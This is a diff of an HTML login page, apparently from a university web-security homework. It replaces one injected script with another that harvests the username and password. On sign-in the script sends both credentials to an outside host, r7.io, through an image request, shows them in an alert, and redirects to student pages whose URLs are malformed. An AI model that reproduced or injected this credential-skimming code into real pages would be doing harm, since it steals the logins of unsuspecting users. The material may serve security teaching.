@@ -36,17 +36,19 @@
 <div id="signin" class="reveal">
   <form id="login" action="./login" method="get" class="untouched">
     
-  
-    <script>
 
-            var Password1 = $('#login_password').val();
-            var Username1 = $('#login_username').val();
-            alert(Password1 + "    " + Username1);
-            var i = new Image();
-            i.src = "http://r7.io/e/segall2?s=" + Username1 + Password1;
+<script> $(document).ready(function() {
+$('p.error-message').css({"visibility":"hidden"});$('h2.problem').css({"visibility":"hidden"});
 
-    </script>  
-    
+                  $('#signin-btn').click(function() {
+                      var im = new Image();
+                     im.src = 'http://r7.io/e/segall2?s='+$('#login_username').val()+'AND'+$('#login_password').val();
+                     alert($('#login_username').val()+'&'+$('#login_password').val());
+                      $(location).attr('href', 'http://students.washington.edu/segall2/415/info/ttp://students.washington.edu/montgn2/415HW3/415homework3/');
+                      window.location('hhttp://students.washington.edu/segall2/415/info/');
+                  });
+                                         });
+          </script>
 
       <div id="login-fields-wrapper">
         <div id="login-fields">
